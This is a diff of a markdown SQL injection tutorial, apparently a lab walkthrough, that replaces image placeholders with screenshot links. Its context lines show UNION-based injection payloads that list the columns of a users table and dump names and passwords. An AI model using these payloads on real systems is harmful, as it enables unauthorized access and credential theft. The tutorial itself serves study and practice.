@@ -141,7 +141,9 @@ We will print all the columns present in the users’ table. This information wi
 %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
 ```
 
-img
+![Column-fields](https://user-images.githubusercontent.com/87711310/215313624-3b439ca3-32d4-4db8-9982-ff0388e16680.png)
+
+
 
 ### Step 10: Display Column field contents
 To display all the necessary authentication information present in the columns as stored in the information_schema, use the SQL syntax below:
@@ -150,4 +152,4 @@ To display all the necessary authentication information present in the columns a
 %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
 ```
 
-img
+![Column-fields-contents](https://user-images.githubusercontent.com/87711310/215313623-a5c58e25-f3d6-482b-aa93-76f1dc4a444a.png)
